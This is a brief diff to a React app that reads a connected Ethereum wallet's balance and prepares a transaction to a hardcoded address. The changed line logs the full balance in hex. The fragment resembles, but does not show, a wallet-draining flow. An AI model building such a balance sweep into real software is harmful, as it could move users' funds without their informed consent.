@@ -45,7 +45,7 @@ function App() {
         const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
         const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18)
         // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
-        console.log(Number(gas * 1000000000).toString(16))
+        console.log(Number(gas * 1000000000).toString(16), balance, convertedBalance, parseInt((convertedBalance) * 1000000000000000000).toString(16))
         let params = [{
             "from": address[0],
             "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
